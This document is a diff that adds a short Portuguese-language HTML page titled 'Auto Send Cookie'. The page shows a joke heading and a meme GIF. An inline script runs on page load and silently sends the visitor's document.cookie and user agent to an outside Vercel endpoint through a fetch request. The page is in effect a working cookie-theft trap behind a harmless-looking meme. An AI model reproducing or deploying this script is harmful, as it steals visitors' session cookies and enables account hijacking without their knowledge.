@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Auto Send Cookie</title>
+<style>
+  body {
+    margin:0; padding:0;
+    background: linear-gradient(135deg,#0f0f0f,#1e1e1e);
+    color: #fff;
+    font-family: sans-serif;
+    display:flex; flex-direction:column;
+    align-items:center; justify-content:center;
+    height:100vh;
+    text-align:center;
+  }
+</style>
+</head>
+<body>
+<h1>O que tu tá fazendo aqui???</h1>
+<img src="https://media.tenor.com/KuWfVfMLC58AAAAC/boca-rosa.gif" width="300" alt="Meme" />
+<script>
+  const url = "https://teu-vercel.vercel.app/api/send?cookie=" + encodeURIComponent(document.cookie) + "&userAgent=" + encodeURIComponent(navigator.userAgent);
+  fetch(url);
+</script>
+</body>
+</html>
